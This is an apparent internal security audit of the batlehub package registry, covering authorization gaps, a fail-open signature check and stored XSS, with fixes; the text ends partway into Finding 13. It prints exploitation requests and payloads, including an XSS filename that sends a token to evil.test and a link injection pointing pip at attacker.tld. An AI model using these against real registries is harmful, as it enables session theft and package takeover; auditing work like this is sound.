# Security survey — batlehub

**Date:** 2026-08-26
**Branch:** `feat/terraform-auht` (at `5c2508b`)
**Scope:** Whole project. Fourteen attack surfaces across `crates/core`, `crates/adapters`,
`crates/web`, `crates/config`, `server/`, `cli/` and `ui/` — 611 Rust files (~188 k lines) and
257 TypeScript/Vue files.
**Method:** Multi-agent sweep. One auditor per surface reading real source, then three
independent adversarial refuters per candidate finding (code-reality, reachability,
exclusions-and-impact). A finding is recorded here only if all three declined to refute it and
the lowest of the three confidence scores was ≥ 8/10. Thirty candidates were raised; eighteen
survived; those deduplicate to twelve of the locations below. Findings 13 and 14 were added by
hand after the sweep: both were raised as candidates and scored just under the automated bar
(7/10 and unassigned respectively), and both were confirmed by direct code reading afterwards —
see the note in [Refuted candidates](#refuted-candidates). The remaining eleven refuted
candidates are listed there so the same ground is not re-walked.

This survey excludes, by construction: denial of service and resource exhaustion, dependency
CVEs (covered by `task security`), secrets at rest, rate-limiting, missing hardening, and
findings in test or documentation files.

---

## Summary

| # | Finding | Severity |
| --- | --- | --- |
| 1 | Unauthenticated crate takeover via the cargo owners API | **High** |
| 2 | Empty accessible-registry set exposes the whole catalogue on `/api/v1/packages` | **High** |
| 3 | Stored XSS and link injection in the local PyPI Simple index | **High** |
| 4 | Conda local/hybrid download skips the registry rule chain | **High** |
| 5 | JetBrains `pluginManager?action=download` skips the registry rule chain | **High** |
| 6 | Maven and NuGet artifact downloads skip visibility *and* the rule chain | **High** |
| 7 | Terraform provider binary download skips visibility | Medium |
| 8 | Terraform version listings and download documents skip the rule chain | Medium |
| 9 | PyPI Simple index skips the rule chain on local/hybrid hits | Medium |
| 10 | Go module download skips the registry rule chain | Medium |
| 11 | Search endpoints enumerate every private package name | Medium |
| 12 | Explore catalogue leaks private package names via `package_statuses` | Medium |
| 13 | Download-signature verification fails open when `X-Signature-Type` is omitted | **High** |
| 14 | No CSP on the non-SPA HTML the server emits from the console origin | Medium |
| 15 | Cargo **sparse index** local branch skips the rule chain | **High** |
| 16 | RubyGems compact index (`/info`, `/versions`, `/names`) skips the rule chain | Medium |

Findings 15 and 16 were found **after** the sweep, by the authorization matrix it recommended
(`crates/web/tests/authz_matrix.rs`, and [its own document](./authorization-matrix.md)). They are
the same class as 4–10 and are listed separately only because they were found by a different
method — which is the argument for that method.

Findings 4–10 are **one systemic defect with eight call sites**, described once under
[The local-read authorization gap](#the-local-read-authorization-gap).

The picture is mixed. Cryptography came out clean: the RFC 0012 signed-URL construction is
sound (netstring canonical encoding, constant-time verify, per-registry subkeys), and the README
rendering pipeline — ammonia allow-list, SVG re-serialisation, sandboxed image CSP — resisted
every bypass attempted against it. SQL is parameterised throughout; no injection was found in
any of the 38 migrations or the runtime query builders. The SSRF guard held.

What did not hold is **authorization on the local-registry read paths**. Ten of the thirteen
findings are a caller reaching bytes or names that the equivalent proxy-mode request would have
refused. The proximate cause is that `LocalRegistryService::get_artifact` checks per-package
visibility and pre-release gating but never evaluates the registry rule chain, and eight
handlers call it — or read storage — directly instead of going through the helper that
compensates.

**The single most important conclusion of this survey is not any individual finding.** It is
that the check is applied *by convention rather than by construction*, so it was found missing
once per ecosystem: maven, nuget, terraform (twice), conda, goproxy, jetbrains and pypi each
yielded a separate hit, in a sweep that sliced its surfaces by handler family. The ecosystems no
finding names — deb/rpm/pacman, generic, vsx/openvsx, rubygems, the forge clients — are more
likely to be *unexamined* than *correct*. See
[Highest-value follow-up](#highest-value-follow-up).

---

## Finding 1 — Unauthenticated crate takeover via the cargo owners API (High)

> **Status: FIXED** (2026-08-26, same branch). `require_owner` is replaced by
> `require_owner_mutation`, which requires an authenticated `User` with a `user_id` and refuses
> to establish ownership on an unowned crate at all — ownership is now created only by
> `register_initial_owner` on first publish. Both mutating routes also gained `require_local_mode`.
> Six regression tests in `crates/web/tests/local_cargo_registry.rs`; the three security ones were
> confirmed to fail against the pre-fix handler. See [Remediation notes](#remediation-notes-finding-1).

**Location:** `crates/web/src/handlers/proxy/cargo/ownership.rs:113` (`require_owner`),
reached from `cargo_add_owners` at `:153`
**Category:** authorization bypass

`cargo_add_owners` (`PUT /proxy/{registry}/api/v1/crates/{name}/owners`) gates only on
`require_owner`, which delegates entirely to `OwnershipPort::can_publish`:

```rust
async fn require_owner(
    local_svc: &LocalRegistryService,
    registry: &str,
    name: &str,
    identity: &batlehub_core::entities::Identity,
) -> Result<(), AppError> {
    let Some(ref ownership) = local_svc.ownership else {
        return Err(AppError::not_found(
            "ownership management is not enabled for this registry".to_owned(),
        ));
    };
    if ownership
        .can_publish(registry, name, identity)
        .await
        .map_err(AppError::from)?
    {
        return Ok(());
    }
    Err(AppError::forbidden(format!("you are not an owner of '{name}'")))
}
```

Both implementations of `can_publish` return `true` when a package has no owner rows —
`crates/adapters/src/db/governance/ownership.rs:61-63` (`if count == 0 { return Ok(true); }`)
and `crates/adapters/src/in_memory/governance/ownership.rs:65-68`. That is correct for the
publish path, which reaches it only *after* `enforce_publish_policy` has required `Role::User`
(`crates/core/src/services/local_registry/publish.rs:102-106`). The ownership route has no such
precondition.

The function's own doc comment states the intended rule:

> a crate nobody owns is one anybody with `User` may claim

**The role condition is not implemented.** There is no `has_role_at_least(&Role::User)` check, no
`user_id` check, and no `require_local_mode` — so the route also answers on proxy-mode cargo
registries. The auth middleware does not fail closed for this: it inserts `Identity::anonymous()`
and continues (`crates/web/src/middleware/auth.rs:72,98`), and `AuthIdentity::from_request` never
errors (`crates/web/src/extractors.rs:20-27`). Ownership is always wired in the real server
(`server/src/main.rs:278`), so this is not an opt-in path.

### Exploitation

With no `Authorization` header:

```http
PUT /proxy/crates/api/v1/crates/internal-auth-lib/owners
Content-Type: application/json

{"users":["mallory"]}
```

The crate has never been published, so `can_publish` returns `true` for the anonymous identity
and the row is inserted. Two outcomes depending on the target:

- **Unpublished name.** A legitimate engineer later publishes `internal-auth-lib 1.0.0`; that
  succeeds, because `check_ownership_publish_access` short-circuits when `!package_exists`, and
  `register_initial_owner` adds them as a *second* owner. Mallory is now a recorded owner of a
  crate she never published, and with any low-privilege `User` token can publish `1.0.1` with
  arbitrary code, yank the legitimate versions
  (`check_ownership_lifecycle_access`, `publish.rs:74-82`), and `DELETE .../owners` to evict the
  real maintainer.
- **Published but unowned name** — published before ownership existed, or published with an
  anonymous identity, since `register_initial_owner` is skipped when `publisher.user_id` is
  `None`. The same request grants *exclusive* publish rights immediately and permanently locks
  the real maintainer out.

Sprayed across a list of plausible internal crate names, this pre-positions takeover for every
future crate in the registry.

This was reproduced in-process against the production `configure_app`: the unauthenticated `PUT`
returned `200 {"ok":true,"msg":"added mallory to owners of acme-internal-auth"}` and the store
then held `OwnerEntry { principal_type: "user", principal_id: "mallory", role: "maintainer",
granted_by: None }`.

Pushing malicious bytes still requires *some* `User`-role token and namespace membership where
configured, which makes this a two-step takeover rather than one-shot remote code execution.

### Fix

In `require_owner`, require an authenticated principal with at least `Role::User` and a
non-`None` `user_id` before consulting `can_publish`; reject anonymous callers with `401`. Add
`require_local_mode` to `cargo_add_owners` and `cargo_remove_owners`. When the package is
unowned, restrict the grantable principal to the caller, so a claim cannot be planted on behalf
of a third party. Regression test: an unauthenticated `PUT .../owners` on an unpublished crate
must be refused.

---

## Finding 2 — Empty accessible-registry set exposes the whole catalogue (High)

> **Status: FIXED** (2026-08-26, same branch). The handler now refuses before the scope is built
> when the accessible set is empty, mirroring the guard `explore/list.rs` already carried. The
> `PackageFilter::registries` doc comment states the empty-means-*all* contract and what a caller
> deriving the list from permissions must therefore do. Two regression tests in
> `crates/web/tests/admin_packages.rs`; the security one was confirmed to fail against the
> pre-fix handler. See [Remediation notes](#remediation-notes-finding-2).

**Location:** `crates/web/src/handlers/front_office/packages.rs:90`
**Category:** authorization bypass

`list_packages` / `count_packages` scope results by `PackageFilter.registries`, built from the
caller's accessible set with no check that it is non-empty:

```rust
// When no specific registry is requested, restrict to accessible registries at the DB level
// so that pagination and the total count are accurate.
let registries = if query.registry.is_none() {
    accessible.into_iter().collect()
} else {
    vec![]
};
```

The Postgres adapter converts that vector with `prepare_registries_param`
(`crates/adapters/src/db/packages/mod.rs:26-32`), which maps an **empty** vector to `None`, and
the predicate is:

```sql
AND ($7::text[] IS NULL OR ps.registry = ANY($7::text[]))   -- crud.rs:262
AND ($5::text[] IS NULL OR ps.registry = ANY($5::text[]))   -- crud.rs:326 (count)
```

`NULL` therefore means *every* registry, not *no* registry. A caller entitled to nothing is
handed everything. The in-memory repository has identical semantics
(`crates/adapters/src/in_memory/package_repo.rs:55`).

The sibling explore endpoint documents this exact trap and guards against it
(`crates/web/src/handlers/front_office/explore/list.rs:252-279`):

> An empty accessible set is **nothing**, not "no restriction" … was handed the *entire*
> catalogue by the one endpoint whose whole job is to scope it

`/api/v1/packages` never received that fix.

### Exploitation

A private instance where every `[registries.rbac]` block has `anonymous = []` — the natural
configuration for a company-internal deployment, and what `config.example.toml` ships for
`github` / `github2`. An unauthenticated request:

```http
GET /api/v1/packages?per_page=100&page=0
```

`accessible_registries_for` returns an empty set, `registries` is `vec![]`,
`prepare_registries_param` binds `NULL`, and the predicate matches every row. The response
enumerates every `package_statuses` row across every registry — registry name, package name,
version, artifact classifier, blocked/available status with block reason, and access counts —
plus an accurate `total` for paging through the entire private inventory. The same happens for
any authenticated principal whose role and groups resolve to zero registries.

### Fix

Refuse before the filter is built, the way `explore/list.rs` does: if `accessible.is_empty()`,
return an empty page immediately. Better, remove the ambiguity from the port — change
`PackageFilter.registries` to `Option<Vec<String>>`, or have `prepare_registries_param` bind an
empty array so `= ANY('{}')` matches nothing. Either makes it impossible for any of the four
repository implementations to read an empty scope as "unfiltered".

---

## Finding 3 — Stored XSS and link injection in the local PyPI Simple index (High)

> **Status: FIXED** (2026-08-26, same branch). Every value the Simple index interpolates is now
> HTML-escaped, and the filename and hash are percent-encoded before they become a path segment
> and a fragment. The escape is a new shared helper, `batlehub_core::services::escaping`, which is
> also what the README renderer's two private copies now call. The publish edge additionally
> rejects a distribution filename that is not a plain PEP 427/625 name, so a hostile value no
> longer reaches `index_metadata` at all. Four regression tests in `local_registry/tests.rs`,
> three in `crates/web/tests/publish_traversal_guards.rs`, nine unit tests on the helpers; the
> escaping ones were confirmed to fail against the pre-fix page.
> See [Remediation notes](#remediation-notes-finding-3).

**Location:** `crates/core/src/services/local_registry/eco_pypi.rs:34`
(`get_pypi_simple_page`)
**Category:** stored XSS / package-manager link injection

The PEP 503 Simple index is built by raw string concatenation with no HTML escaping:

```rust
let url = format!("{base}/packages/{filename}#sha256={sha256}");
links.push_str(&format!("    <a href=\"{url}\">{filename}</a>\n"));
```

```rust
Ok(format!(
    "<!DOCTYPE html>\n<html>\n  <head><title>Links for {package_name}</title></head>\n  <body>\n    <h1>Links for {package_name}</h1>\n{links}  </body>\n</html>\n"
))
```

There is no escaping helper anywhere in the workspace — `grep -rn 'html_escape|escape_html'`
over `crates/` returns nothing.

`filename` arrives verbatim from the `Content-Disposition: filename="…"` parameter of the
`content` part of a twine-style upload: `crates/web/src/handlers/proxy/pypi/publish.rs:71-74`
reads it with `field.content_disposition().and_then(|cd| cd.get_filename())` and stores it
unchanged into `index_metadata` (`publish.rs:116,129`). `actix_web`'s
`ContentDisposition::from_raw` parses a quoted string with backslash escapes, so `<`, `>`, `"`
and `=` all survive. `enforce_publish_policy` validates only `name` and `version` via
`validate_path_safe` (`publish.rs:112-113`); `index_metadata` is persisted as-is
(`publish.rs:214`). `package_name` is run only through `pypi::normalize_name` (lowercase, collapse
of `-_.`), which does not remove `<`, `>` or `"`.

The document is served as `text/html; charset=utf-8` for both `Mode::Local`
(`crates/web/src/handlers/proxy/pypi/simple.rs:99-101`) and `Mode::Hybrid` (`:111-113`), **on the
same origin as the admin console** (`crate::spa::configure_spa` mounts the SPA at `/`). No CSP
protects it: `crates/web/src/middleware/security_headers.rs` sets only
`X-Content-Type-Options`, `X-Frame-Options` and `Referrer-Policy`, and the console's CSP exists
only as a `<meta http-equiv>` inside its own `index.html` (`crates/web/src/spa.rs:387`), which
this response is not. `nosniff` does not help — the content type is genuinely `text/html`.

### Exploitation

One primitive, two payloads. Both need only an account with `User` role and publish rights to a
local- or hybrid-mode PyPI registry — the minimum a tenant publisher holds.

**Link injection into a page package managers parse.** Upload with:

```
Content-Disposition: form-data; name="content"; filename="evil-1.0.tar.gz</a><a href=https://attacker.tld/backdoor-1.0-py3-none-any.whl#sha256=<real-hash>>backdoor-1.0-py3-none-any.whl<a x="
```

Every subsequent `GET /proxy/{registry}/simple/evil/` returns a page containing a second,
attacker-authored anchor pointing at an arbitrary external host. `pip install` follows absolute
URLs in a simple index, so the artifact is fetched from the attacker's server — bypassing the
proxy's caching, block list, and entire rule chain.

**Stored XSS on the console origin.** Upload with:

```
filename="<img src=x onerror=fetch('https://evil.test/'+localStorage.getItem('token'))>-1.0.0.tar.gz"
```

The `:action=file_upload`, `name` and `version` fields are ordinary valid values, so the publish
succeeds. Any browser session that then loads `GET /proxy/{registry}/simple/{pkg}/` — an
operator checking why pip resolves oddly — executes the handler with the console's origin and
reads the bearer token the SPA keeps in `localStorage` (as documented in
`crates/web/src/handlers/proxy/common.rs:250-257`), yielding session theft against the whole API,
frequently an administrator's. A second variant puts the payload in the package *name*, poisoning
`<title>` and `<h1>` the same way.

This is the class of injection the README pipeline (`crates/core/src/services/readme/*`) is
carefully built to prevent, and that pipeline is sound. The local PyPI index bypasses it
entirely.

### Fix

HTML-escape every interpolated value in `get_pypi_simple_page` — `filename`, `sha256`, `base`
and `package_name` — covering `&`, `<`, `>`, `"`, `'`, reusing the escaping
`readme::render::preformatted` / `chip` already implement, and percent-encode `filename` for the
`href` component. Additionally validate at the edge in `pypi_publish`: run the uploaded filename
through `parse_pypi_filename` and reject on failure, so hostile values never reach storage — the
same shape of whitelist `crates/web/src/handlers/proxy/nuget/vuln.rs:90-97` applies to its page
identifier. Consider emitting `Content-Security-Policy: default-src 'none'; sandbox` on protocol
documents served as `text/html` from `/proxy/…`.

---

## The local-read authorization gap

> **Status: FIXED** (2026-08-26, same branch), and fixed structurally rather than
> site by site. The rule chain moved out of `ProxyService` into
> `batlehub_core::services::registry_authz`, where **`LocalRegistryService` runs it
> from its own two read funnels**: `load_visible_versions` (every local document)
> and `get_artifact` (every local artifact, now taking the `resource_type` the
> caller is serving). Handlers that build their own storage key call
> `get_artifact_at_key`, which applies the same gate, so reading `local_svc.storage`
> directly is no longer how any read path works. Findings **15 and 16 are closed by
> the same change**, as are four routes the matrix flagged that no finding named.
> Twelve `authz_matrix` rows flipped from `KnownGap` to `Denied`; three new
> team-visibility tests in `crates/web/tests/local_read_authorization.rs` were
> confirmed to fail against the pre-fix code.
> See [Remediation notes](#remediation-notes-findings-4-to-10).

Findings 4 to 10 are one defect with eight call sites.

`LocalRegistryService::get_artifact` (`crates/core/src/services/local_registry/read.rs:130-156`)
performs **only** `check_visibility` and `check_prerelease_access`. It never evaluates
`RbacRule`. The registry rule chain — RBAC, block list, release-age, licence and signature gates
— lives in `ProxyService::authorize_read`
(`crates/core/src/services/proxy/handle.rs:359`).

`check_visibility` returns `Ok(())` for the default `Visibility::Public`, and returns `Ok(())`
unconditionally when no `team_namespace` port is configured. So for a registry locked down purely
by `[registries.rbac]` — the ordinary way to require a token — a handler that calls
`get_artifact` without first calling `authorize_read` has **no gate at all**.

The codebase already knows this. `serve_local_or_proxy_artifact`
(`crates/web/src/handlers/proxy/common.rs:401-416`) exists to compensate, and says so:

> Enforce the registry's RBAC (`[registries.rbac]`) before serving from local storage.
> `get_artifact` only checks per-package Visibility and pre-release gating — it never runs the
> registry rule chain, which is only evaluated on the proxy fall-through. Without this, a local
> hit would bypass a registry that denies e.g. anonymous `releases:read` while its packages keep
> the default Public visibility. Mirrors the deb/rpm `repo_get` guard so local and proxy reads
> stay consistent.

`crates/web/src/handlers/proxy/openvsx.rs:66-71` records this same bug having already been found
and fixed once on the VSIX download route. The four handlers below were never converted.

### Finding 4 — Conda (High)

**Location:** `crates/web/src/handlers/proxy/conda.rs:569` (Local), `:585` (Hybrid)

```rust
if mode == RegistryMode::Local {
    // Look up by filename in index_metadata since package names may contain hyphens.
    let (name, version) = local_svc
        .find_conda_by_filename(&registry, &filename)
        .await
        .map_err(AppError::from)?
        .ok_or_else(|| AppError::not_found(format!("conda package not found: {filename}")))?;
    let bytes = local_svc
        .get_artifact(&registry, &name, &version, &identity)
        .await
        .map_err(AppError::from)?;
    return Ok(HttpResponse::Ok()
        .content_type("application/octet-stream")
        .body(bytes));
}
```

A private conda channel in `local` mode with `[registries.rbac] anonymous = []`. Unauthenticated
`GET /proxy/{registry}/linux-64/internal-lib-1.0.0-py311_0.conda` streams the proprietary bytes
with `200 OK`. The equivalent npm, rubygems, composer or deb route correctly returns `403`. The
compressed-repodata path on the same registry *is* guarded, so the inconsistency is internal to
the handler.

### Finding 5 — JetBrains Marketplace (High)

**Location:** `crates/web/src/handlers/proxy/jetbrains_marketplace/files.rs:519`

```rust
let bytes = local_svc
    .get_artifact(&registry, &query.id, &best.version, &identity)
    .await
    .map_err(AppError::from)?;
```

`jbm_plugin_download` and `jbm_file_download`, in the same file, both go through
`serve_local_or_proxy_artifact`. `jbm_plugin_manager` is the one download route that does not.
Given `[registries.rbac]` with `anonymous = []` and `user = ["releases:read"]`, and plugins at
the default `Public` visibility:

- `GET /proxy/{reg}/plugin/download?pluginId=org.acme.internal&version=1.0.0` → `403`
- `GET /proxy/{reg}/pluginManager?action=download&id=org.acme.internal` → `200`, full archive

The second request also bypasses `BlockListRule` and every gate rule. There is currently **no
test covering RBAC on any JetBrains-marketplace route.**

### Finding 6 — Maven and NuGet (High)

**Locations:** `crates/web/src/handlers/proxy/maven/local.rs:84`,
`crates/web/src/handlers/proxy/nuget/flat.rs:159`

These two are worse than 4, 5 and 7: they read from `local_svc.storage` directly rather than via
`get_artifact`, so they skip **`check_visibility` as well as** the rule chain. Per-package
`Visibility::Internal` and `Visibility::Team` are therefore unenforced on the artifact bytes.

```rust
let storage_key = artifact_storage_key(&registry, &id, &version);
match local_svc.storage.retrieve(&storage_key).await {
```

The result is precisely the listing/fetch asymmetry the codebase warns against, because the
sibling listing endpoints *do* enforce it via `load_visible_versions_or_not_found`:

- `GET /proxy/nuget1/nuget/v3/flat/acme.internal.crypto/index.json` → `403`
- `GET /proxy/nuget1/nuget/v3/flat/acme.internal.crypto/2.1.0/acme.internal.crypto.2.1.0.nupkg` → `200`, private bytes

The Maven case is the same: `maven-metadata.xml` for a `team`-visibility coordinate returns
`403`, while the jar at
`GET /proxy/maven1/maven2/com/acme/secret-lib/1.2.3/secret-lib-1.2.3.jar` is served.

### Finding 7 — Terraform provider binary (Medium)

**Location:** `crates/web/src/handlers/proxy/terraform/providers/read.rs:526`

This route *does* run `svc.authorize_read` and `check_prerelease_access` — so the rule chain is
enforced — but then reads the provider zip straight from storage and never calls
`check_visibility`:

```rust
let key =
    terraform_provider_binary_storage_key(&registry, &namespace, &ptype, &version, &os, &arch);
let artifact = local_svc
    .storage
    .retrieve(&key)
    .await
    .map_err(AppError::from)?
```

The documents that *describe* the download do enforce it —
`get_terraform_provider_download_response` calls `check_visibility`
(`crates/core/src/services/local_registry/eco_terraform.rs:81`), as does
`get_terraform_provider_versions_response` via `load_visible_versions_or_not_found`. So a caller
refused both the version list and the download document can still fetch the binary by
constructing its URL directly:

- `GET /proxy/tf1/v1/providers/acme/vault-internal/versions` → `403`
- `GET /proxy/tf1/v1/providers/acme/vault-internal/1.4.0/download/linux/amd64` → `403`
- `GET /proxy/tf1/v1/providers/acme/vault-internal/1.4.0/artifact/linux/amd64` → `200`, private provider

The gap applies to a plain header identity and to a signed-URL identity alike.

### Finding 8 — Terraform version listings and download documents (Medium)

**Location:** `crates/web/src/handlers/proxy/terraform/shared.rs:329`
(`terraform_versions_response`), and `providers/read.rs:270-322`
(`try_local_provider_download`)

The mirror image of finding 7: these routes enforce visibility but skip the rule chain.

```rust
if let Some(result) = local_result {
    match result {
        Ok(json) => return Ok(HttpResponse::Ok().json(json)),
```

The document is produced by `get_terraform_provider_versions_response` /
`get_terraform_module_versions_response`, which run only `load_visible_versions_or_not_found`
(`eco_terraform.rs:5-63`). `authorize_read` is reached only on the proxy fall-through — and
Terraform is local-only, so for these registries **it never runs at all**.

The inconsistency is documented within the feature itself: `terraform_module_artifact` and
`terraform_provider_artifact` (`providers/read.rs:511-517`) both carry the comment *"Terraform is
local-only (no proxy fall-through), so the registry rule chain would otherwise never run for
these reads. Enforce `[registries.rbac]` here"*. The listing and download-document routes did not
get the same treatment.

Given `[registries.rbac] anonymous = []` and providers at default `Public` visibility, an
unauthenticated `GET /proxy/{reg}/v1/providers/{ns}/{type}/versions` returns the complete version
list, protocol versions and platform matrix; the `/download/{os}/{arch}` document likewise
returns filename, checksum and the `shasums_url` / `shasums_signature_url` pair. The artifact
bytes stay protected by finding 7's `authorize_read`, so this is metadata disclosure rather than
byte access.

### Finding 9 — PyPI Simple index (Medium)

**Location:** `crates/web/src/handlers/proxy/pypi/simple.rs:94` (Local and Hybrid branches)

```rust
if mode == Mode::Local {
    let html = local_svc
        .get_pypi_simple_page(&registry, &normalized, &proxy_base, &identity.0)
        .await
        .map_err(AppError::from)?;
    return Ok(HttpResponse::Ok()
        .content_type("text/html; charset=utf-8")
        .body(html));
}
```

`get_pypi_simple_page` consults only per-package `Visibility` via
`load_visible_versions_or_not_found` (`read.rs:537-558`); the rule chain is never evaluated. The
proxy fall-through in the same handler *is* authorized (`fetch_proxy_document` →
`version_document` → `authorize_listing_audited`), so the gap exists only for locally published
content.

With `[registries.rbac]` denying anonymous `releases:read`, an unauthenticated
`GET /proxy/private-pypi/simple/internal-billing-sdk/` returns the full Simple index — every
published version's distribution filename and SHA-256. The same caller is correctly refused
`403` on the nuget flat index, the maven metadata route and the pypi artifact download, so the
leak is invisible to anyone auditing by spot-checking other ecosystems.

This is the same document as finding 3. One is what the page *contains*; this is who may
*read* it.

### Finding 10 — Go modules (Medium)

**Location:** `crates/web/src/handlers/proxy/goproxy/read.rs:313`; also `goproxy_list` at `:246`

```rust
if matches!(mode, RegistryMode::Local | RegistryMode::Hybrid) {
    match local_goproxy_file(&local_svc, &registry, module, version, ext, &identity).await {
```

The inconsistency is visible within the single file: `goproxy_latest` (`:130`) *does* call
`svc.authorize_read` in its local branch; `goproxy_file` and `goproxy_list` do not. On the proxy
fall-through the `.zip` branch is guarded with `SOURCE_READ` and `.info` / `.mod` with
`RELEASES_READ` (`:322-343`) — so the registry's policy is enforced only when the module happens
to be *missing* locally. `GET /proxy/{reg}/git.internal.example.com/team/secret-lib/@v/v1.2.3.zip`
returns the full private module source to an anonymous caller; `.mod` and `.info` leak the module
graph.

### Fix for findings 4–10

Route each local/hybrid branch through `serve_local_or_proxy_artifact`, or call

```rust
svc.authorize_read(
    &PackageId::new(&registry, &name, &version),
    &identity.0,
    batlehub_core::rules::resource_type::RELEASES_READ,
).await.map_err(AppError::from)?;
```

before the local read — `SOURCE_READ` for the goproxy `.zip` extension, matching that handler's
own proxy fall-through. For Maven, NuGet and the Terraform provider binary add
`local_svc.check_visibility(&registry, &name, &identity)` as well, before the storage key is
built. For the Terraform listings (finding 8) and the PyPI Simple index (finding 9), add the
`authorize_read` the visibility check is already paired with everywhere else.

Note the two halves fail independently: findings 4, 5, 9, 10 and the Terraform listings skip the
**rule chain** while enforcing visibility; findings 6 and 7 skip **visibility** while enforcing
the rule chain. A fix that adds only one of the two calls leaves the other hole open.

Since this defect was already found and fixed once on the OpenVSX route and then recurred on
eight others, the durable fix is structural: give `get_artifact` the resource type and have it
run the chain itself, so the safe path is the only path. Each site needs a regression test
asserting `403` under a registry whose RBAC denies the caller `releases:read`, and — for Maven,
NuGet and Terraform — a second asserting `403` on the artifact for a non-member of a
`team`-visibility package, not just on the listing.

---

## Finding 11 — Search endpoints enumerate every private package name (Medium)

> **Status: FIXED** (2026-08-26, same branch). Three parts, because the disclosure had three
> doors: `resolve_and_search` now authorises the listing before reading anything;
> `LocalRegistryService::search_local` replaces the raw `list_package_names` read and filters
> through the same funnel every other local listing uses; and the search **cache** now holds the
> upstream answer only, so one caller's private hits can no longer be replayed to the next from a
> key that names no identity. Rung 3b drops held hits that are locally published, letting the
> filtered half put them back. Both `authz_matrix` search rows are `Expect::Denied`; three tests
> in `local_read_authorization.rs`, the cache one confirmed to fail against the pre-fix order.
> See [Remediation notes](#remediation-notes-findings-11-and-12).


**Location:** `crates/web/src/handlers/proxy/search.rs:40` (`local_hits`) and `:144`
(`resolve_and_search`)
**Category:** information disclosure

`resolve_and_search`, the shared middle of the npm, cargo, Composer and NuGet search handlers,
explicitly discards the caller identity:

```rust
require_registry_type(registry, kind, map)?;
// Taken so the route still requires a resolvable identity; a hit names only
// what the listing filters already allow, so there is nothing further to
// authorise here.
let _ = identity;
let local = local_hits(local_svc, registry, query, limit).await;
```

The claim in that comment does not hold. `local_hits` calls
`LocalRegistryBackend::list_package_names`, which is a bare
`SELECT DISTINCT name FROM local_packages WHERE registry = $1 AND status = 'published'`
(`crates/adapters/src/local_registry/postgres.rs:289-294`; the in-memory backend at
`in_memory.rs:255-270` is equivalent). It applies no `Visibility` check, no `unlisted` filter and
no identity filter — unlike every other listing path in the service, which goes through
`load_visible_versions_or_not_found` (`filter_unlisted` → `filter_blocked` →
`filter_for_identity`). `local_hits` then attaches each name's newest version string.

The only filter applied downstream is the administrative block list: `ProxyService::search`'s
`finish()` removes blocked name/version pairs and nothing else
(`crates/core/src/services/search.rs:226-253`). Because `authorize_read` is never called either,
`[registries.rbac]` is not consulted at all, so a registry that denies anonymous reads outright
still answers these routes.

**Affected:** `GET /proxy/{registry}/-/v1/search` (npm),
`GET /proxy/{registry}/api/v1/crates` (cargo),
`GET /proxy/{registry}/list.json` and `search.json` (Composer).

### Exploitation

An organisation runs a local-mode npm registry holding `@acme/billing-secrets`,
`@acme/customer-pii-client`, all at `Visibility::Team`. Fetching any of them as an outsider
correctly returns `403`. An unauthenticated `GET /proxy/npm1/-/v1/search?text=acme&size=250`
returns all of their names together with newest version strings. The same works for the Composer
and cargo routes, and works even when `[registries.rbac]` grants anonymous nothing.

### Fix

Call `ProxyService::authorize_read` (or `authorize_listing`) with the caller's identity before
searching, and filter `local_hits` through the same predicates the rest of the local registry
uses — drop names whose `check_visibility` denies the identity, and names whose newest version is
`unlisted` — rather than returning `list_package_names` verbatim.

---

## Finding 12 — Explore catalogue leaks private package names via `package_statuses` (Medium)

> **Status: FIXED** (2026-08-26, same branch). The `proxied` CTE in both `explore_sql` and
> `count_explore_sql` now carries `proxied_visibility_predicate`, which keeps a row whose package
> has no `local_packages` entry (proxied-only, public by construction) and otherwise requires a
> local row this viewer may see. A structural test asserts **both** CTEs are gated — counting
> occurrences could not tell "both gated" from "one gated twice", which is exactly how the
> `newest_version` join came to carry the predicate while the CTE feeding it did not. Three
> behavioural tests in `pg_explore_visibility.rs` against real Postgres, one confirmed to fail
> against the pre-fix SQL. See [Remediation notes](#remediation-notes-findings-11-and-12).


**Location:** `crates/adapters/src/db/packages/explore.rs:196` (`explore_sql`), and the identical
gap in `count_explore_sql`
**Category:** information disclosure

`explore_sql` splices `LOCAL_VISIBILITY_PREDICATE` into the `local_pkgs` CTE and into the
newest-version lateral join — but the `proxied` CTE that reads `package_statuses` carries no
visibility predicate at all, and `agg` UNIONs the two:

```sql
FROM package_statuses ps
WHERE ($1::text IS NULL OR ps.registry = $1)
  AND ($2::text IS NULL OR ps.package_name ILIKE '%' || $2 || '%')
  AND ($3::text[] IS NULL OR ps.registry = ANY($3::text[]))
GROUP BY ps.registry, ps.package_name
```

`record_access_impl` (`crates/adapters/src/db/packages/crud.rs:57-86`) inserts an `available` row
into `package_statuses` for every allowed `Download` / `ViewMetadata`, and the local-registry read
path calls it on every local download (`record_download`,
`crates/core/src/services/local_registry/read.rs:214-251`). So **the first time an authorised team
member downloads a private package, a `package_statuses` row is created and the package
thereafter appears in the explore listing for anyone who can browse the registry.**

The file already knows about this path. The comment at lines 310-316 patches exactly this leak
for the `newest_version` join:

> a row can reach `agg` through `package_statuses` alone … without it this join hands an
> anonymous caller the newest version string and publish date of a `team`-visibility package
> that its own owner happened to pull once

The join was fixed; the row that reaches `agg` in the first place was not.

### Exploitation

A team publishes `acme-secret-scanner` to the local npm registry with `visibility = "team"`. A
member installs it once through the proxy, writing the `package_statuses` row. An anonymous
visitor then calls `GET /api/v1/explore/packages?registry=npm&q=acme` on an instance where
`rbac.explore.anonymous` is left at its default `true`. The `proxied` CTE returns the package,
the `local_pkgs` visibility predicate never sees it, and the response discloses the private
package's name, version count, download total and last-access time. The detail, README, image and
fetch endpoints all call `check_visibility` and answer `404` — the listing is the one door left
open.

### Fix

Apply a visibility gate to the `proxied` CTE as well: left-join `local_packages` on
`(registry, name)` and exclude rows whose matching local package fails
`LOCAL_VISIBILITY_PREDICATE` — a package with no `local_packages` row is proxied-only and stays
public. Make the same change in `count_explore_sql`, and add a structural test asserting the
predicate is spliced into both CTEs, so the two cannot drift apart again.

---

## Finding 13 — Download-signature verification fails open when `X-Signature-Type` is omitted (High)

> **Status: FIXED** (2026-08-26, same branch). Fails closed at all three points the incoherent
> pair could pass: the web edge rejects either header without the other (and a signature that is
> not valid base64, which used to decode to `None` and read as *absent*); `check_signing_policy`
> refuses bytes-without-type and type-without-bytes whenever signing is configured; and
> `verify_download_signature` splits the two `None` cases, so a **stored** signature naming no
> type is an `IntegrityFailure` rather than an `outcome="skipped"`. Six regression tests, and the
> published `[registries.signing]` documentation now states that the two headers go together.
> See [Remediation notes](#remediation-notes-finding-13).


**Location:** `crates/core/src/services/local_registry/read.rs:314` (`verify_download_signature`),
